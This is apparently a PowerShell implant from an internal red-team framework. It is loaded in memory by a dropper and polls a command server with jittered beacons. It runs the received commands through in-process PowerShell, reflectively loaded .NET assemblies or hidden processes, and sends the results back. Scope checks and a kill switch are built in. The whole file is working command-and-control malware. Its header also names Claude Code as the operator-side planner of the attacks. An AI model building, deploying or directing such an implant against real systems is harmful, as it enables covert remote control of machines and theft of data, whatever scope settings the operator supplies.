#Requires -Version 5.1
<#
  TAR Internal Red Team — workstation agent.
  Loaded in-memory by dropper.ps1. Never written to disk.

  Design contract:
    - $Global:TarConfig must be set by the dropper before this script is invoked.
    - Agent polls the server for commands, executes them in-process (or via
      reflection for .NET binaries), and ships results back.
    - Claude Code on the operator side is the planning brain. This script is
      the executor only — it never decides what to run next.
    - Three independent scope checks guard every command (see Test-Scope).
    - Kill-switch: server returning kill:true OR engagement expiry causes
      the agent to wipe state and exit immediately.
#>

$ErrorActionPreference = 'SilentlyContinue'

# ── Config from dropper ───────────────────────────────────────────────────────
$CFG            = $Global:TarConfig
$SERVER         = $CFG.ServerUrl
$AGENT_ID       = $CFG.AgentId
$AGENT_KEY      = $CFG.AgentKey
$CERT_PIN       = $CFG.CertPin
$ACCESS_LEVEL   = $CFG.AccessLevel
$HOST_PROFILE   = $CFG.HostProfile
$ENGAGEMENT_ID  = $CFG.EngagementId

# Access-level rank map — mirrors xmind_parser.py ACCESS_LEVEL_GATES
$ACCESS_RANK = @{
    network_only    = 0
    valid_username  = 1
    authenticated   = 2
    local_admin     = 3
    domain_admin    = 4
    enterprise_admin = 5
}

# ── Cert-pinned HTTP ──────────────────────────────────────────────────────────
$script:PinValidator = [System.Net.Security.RemoteCertificateValidationCallback]{
    param($s, $cert, $chain, $err)
    $got = [System.Security.Cryptography.X509Certificates.X509Certificate2]$cert
    $thumb = ($got.GetCertHashString('SHA256')).ToLower()
    $expected = $using:CERT_PIN.ToLower() -replace '[:\-\s]',''
    return $thumb -eq $expected
}

function Invoke-TarPost {
    param([string]$Path, $Body, [switch]$IgnoreErrors)
    $handler = New-Object System.Net.Http.HttpClientHandler
    $handler.ServerCertificateCustomValidationCallback = $script:PinValidator
    $client  = New-Object System.Net.Http.HttpClient($handler)
    $client.Timeout = [System.TimeSpan]::FromSeconds(20)
    $client.DefaultRequestHeaders.Authorization =
        [System.Net.Http.Headers.AuthenticationHeaderValue]::new('Bearer', $AGENT_KEY)
    try {
        $json = [System.Net.Http.StringContent]::new(
            ($Body | ConvertTo-Json -Compress -Depth 8),
            [System.Text.Encoding]::UTF8, 'application/json')
        $resp = $client.PostAsync("$SERVER$Path", $json).GetAwaiter().GetResult()
        $text = $resp.Content.ReadAsStringAsync().GetAwaiter().GetResult()
        if (-not $resp.IsSuccessStatusCode -and -not $IgnoreErrors) {
            Write-Verbose "[TAR] HTTP $([int]$resp.StatusCode) at $Path : $text"
            return $null
        }
        return $text | ConvertFrom-Json
    } catch {
        if (-not $IgnoreErrors) { Write-Verbose "[TAR] POST $Path failed: $_" }
        return $null
    } finally {
        $client.Dispose(); $handler.Dispose()
    }
}

# ── Scope validation ─────────────────────────────────────────────────────────
function Test-InCidr {
    param([string]$Ip, [string[]]$Cidrs)
    try {
        $ipBytes = ([System.Net.IPAddress]::Parse($Ip)).GetAddressBytes()
        foreach ($cidr in $Cidrs) {
            $parts   = $cidr -split '/'
            $netAddr = ([System.Net.IPAddress]::Parse($parts[0])).GetAddressBytes()
            $prefix  = [int]$parts[1]
            $mask    = [System.Net.IPAddress]::new([uint32]([uint32]0xFFFFFFFF -shl (32 - $prefix))).GetAddressBytes()
            $match   = $true
            for ($i = 0; $i -lt 4; $i++) {
                if (($ipBytes[$i] -band $mask[$i]) -ne ($netAddr[$i] -band $mask[$i])) {
                    $match = $false; break
                }
            }
            if ($match) { return $true }
        }
    } catch {}
    return $false
}

function Test-Scope {
    param([hashtable]$Cmd, [hashtable]$Scope)
    # Hostname must match the pattern the engagement was created with
    if ($Scope.hostname_pattern) {
        if ($HOST_PROFILE.hostname -notmatch $Scope.hostname_pattern) {
            return @{ ok=$false; reason="hostname '$($HOST_PROFILE.hostname)' outside scope pattern" }
        }
    }
    # Target domain constraint
    if ($Cmd.target_domain -and $Cmd.target_domain -ne $Scope.domain) {
        return @{ ok=$false; reason="target_domain '$($Cmd.target_domain)' != scope domain '$($Scope.domain)'" }
    }
    # Target IP must be inside a scope subnet
    if ($Cmd.target_ip) {
        if ($Scope.subnets -and -not (Test-InCidr $Cmd.target_ip $Scope.subnets)) {
            return @{ ok=$false; reason="target_ip $($Cmd.target_ip) outside scope subnets" }
        }
    }
    # Excluded hosts
    if ($Scope.excluded_hosts -and $Cmd.target_hostname) {
        if ($Scope.excluded_hosts -contains $Cmd.target_hostname) {
            return @{ ok=$false; reason="target_hostname $($Cmd.target_hostname) is excluded" }
        }
    }
    # Destructive gate
    if ($Cmd.destructive -and -not $Scope.allow_destructive) {
        return @{ ok=$false; reason="destructive command blocked by engagement profile" }
    }
    # Access-level gate (checked against what the dropper detected)
    if ($Cmd.required_access_level) {
        $required = $ACCESS_RANK[$Cmd.required_access_level]
        $current  = $ACCESS_RANK[$ACCESS_LEVEL]
        if ($null -eq $required) { $required = 0 }
        if ($null -eq $current)  { $current  = 0 }
        if ($current -lt $required) {
            return @{ ok=$false; reason="access level '$ACCESS_LEVEL' (rank $current) < required '$($Cmd.required_access_level)' (rank $required)" }
        }
    }
    return @{ ok=$true; reason='' }
}

# ── Execution dispatch ───────────────────────────────────────────────────────
$script:SharpBlobs = @{}  # name → byte[] for in-memory .NET reflection

function Invoke-PsNative {
    param([string]$Script)
    $ps = [System.Management.Automation.PowerShell]::Create()
    $ps.AddScript($Script) | Out-Null
    $stdout = @()
    $stderr = @()
    try {
        $stdout = $ps.Invoke() | ForEach-Object { $_.ToString() }
        if ($ps.HadErrors) {
            $stderr = $ps.Streams.Error | ForEach-Object { $_.ToString() }
        }
    } finally {
        $ps.Dispose()
    }
    return $stdout -join "`n", ($stderr -join "`n")
}

function Invoke-DotNetReflect {
    param([string]$BlobName, [string[]]$Args)
    $bytes = $script:SharpBlobs[$BlobName]
    if (-not $bytes) { return '', "binary '$BlobName' not pre-loaded" }
    $asm = [System.Reflection.Assembly]::Load($bytes)
    $sw  = New-Object System.IO.StringWriter
    [Console]::SetOut($sw)
    try {
        $asm.EntryPoint.Invoke($null, @(, [string[]]$Args))
    } catch {
        [Console]::SetOut([System.IO.StreamWriter]::new([System.Console]::OpenStandardOutput()))
        return '', $_.ToString()
    }
    [Console]::SetOut([System.IO.StreamWriter]::new([System.Console]::OpenStandardOutput()))
    return $sw.ToString(), ''
}

function Invoke-NativeExec {
    param([string]$Executable, [string]$Arguments)
    $psi           = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName  = $Executable
    $psi.Arguments = $Arguments
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError  = $true
    $psi.UseShellExecute        = $false
    $psi.CreateNoWindow         = $true
    $p = [System.Diagnostics.Process]::Start($psi)
    $stdout = $p.StandardOutput.ReadToEnd()
    $stderr = $p.StandardError.ReadToEnd()
    $p.WaitForExit()
    return $stdout, $stderr
}

function Invoke-Command-Block {
    param([hashtable]$Cmd)
    $mode = $Cmd.exec_mode
    $sw   = [System.Diagnostics.Stopwatch]::StartNew()
    $stdout = ''; $stderr = ''; $exitCode = 0

    try {
        switch ($mode) {
            'powershell_native' {
                $stdout, $stderr = Invoke-PsNative -Script $Cmd.command_body
            }
            'dotnet_reflect' {
                $stdout, $stderr = Invoke-DotNetReflect -BlobName $Cmd.blob_name -Args $Cmd.args
            }
            'native_exec' {
                $stdout, $stderr = Invoke-NativeExec -Executable $Cmd.executable -Arguments ($Cmd.args -join ' ')
            }
            default {
                $stderr = "Unknown exec_mode: $mode"
                $exitCode = 1
            }
        }
    } catch {
        $stderr   = $_.ToString()
        $exitCode = 1
    }
    $sw.Stop()
    return @{
        stdout      = $stdout
        stderr      = $stderr
        exit_code   = $exitCode
        duration_ms = $sw.ElapsedMilliseconds
    }
}

# ── Heartbeat + command loop ─────────────────────────────────────────────────
function Start-AgentLoop {
    $SleepBase   = 45
    $SleepJitter = 15
    $scope       = $null

    Write-Host "[TAR] Agent loop started. agent_id=$AGENT_ID  access_level=$ACCESS_LEVEL"

    while ($true) {
        # Jittered sleep (first iteration skips sleep)
        if ($scope -ne $null) {
            $delay = $SleepBase + (Get-Random -Minimum (-$SleepJitter) -Maximum $SleepJitter)
            Start-Sleep -Seconds ([Math]::Max(5, $delay))
        }

        # Heartbeat
        $hb = Invoke-TarPost -Path '/api/v1/heartbeat' -Body @{
            agent_id     = $AGENT_ID
            access_level = $ACCESS_LEVEL
        }

        if ($null -eq $hb) { continue }

        # Server-side kill switch
        if ($hb.kill) {
            Write-Host "[TAR] Kill signal received. Wiping state and exiting."
            Remove-Variable -Name TarConfig -Scope Global -ErrorAction SilentlyContinue
            $script:SharpBlobs = @{}
            exit 0
        }

        # Update heartbeat interval if server says so
        if ($hb.sleep_seconds) { $SleepBase = [int]$hb.sleep_seconds }

        # Latch scope config from server (sent on first heartbeat)
        if ($hb.scope)       { $scope = $hb.scope }
        if ($null -eq $scope) { $scope = @{} }

        # Expiry check
        if ($hb.expiry_utc) {
            try {
                $exp = [datetime]::Parse($hb.expiry_utc, $null,
                    [System.Globalization.DateTimeStyles]::AssumeUniversal)
                if ([datetime]::UtcNow -gt $exp) {
                    Write-Host "[TAR] Engagement expired at $($hb.expiry_utc). Exiting."
                    Remove-Variable -Name TarConfig -Scope Global -ErrorAction SilentlyContinue
                    exit 0
                }
            } catch {}
        }

        # Process pending commands
        $commands = $hb.commands
        if (-not $commands) { continue }

        foreach ($raw in $commands) {
            $cmd = if ($raw -is [hashtable]) { $raw } else {
                $raw.PSObject.Properties | ForEach-Object -Begin { $h=@{} } `
                    -Process { $h[$_.Name] = $_.Value } -End { $h }
            }

            # Scope check (three independent gates)
            $check = Test-Scope -Cmd $cmd -Scope $scope
            if (-not $check.ok) {
                Write-Verbose "[TAR] Scope blocked cmd $($cmd.command_id): $($check.reason)"
                Invoke-TarPost -IgnoreErrors -Path '/api/v1/result' -Body @{
                    agent_id   = $AGENT_ID
                    command_id = $cmd.command_id
                    stdout     = ''
                    stderr     = "SCOPE_BLOCKED: $($check.reason)"
                    exit_code  = -1
                    duration_ms = 0
                } | Out-Null
                continue
            }

            # Execute
            $result = Invoke-Command-Block -Cmd $cmd
            $result.agent_id   = $AGENT_ID
            $result.command_id = $cmd.command_id

            Invoke-TarPost -IgnoreErrors -Path '/api/v1/result' -Body $result | Out-Null
        }
    }
}

# Entry point (called by dropper after HMAC verification)
Start-AgentLoop
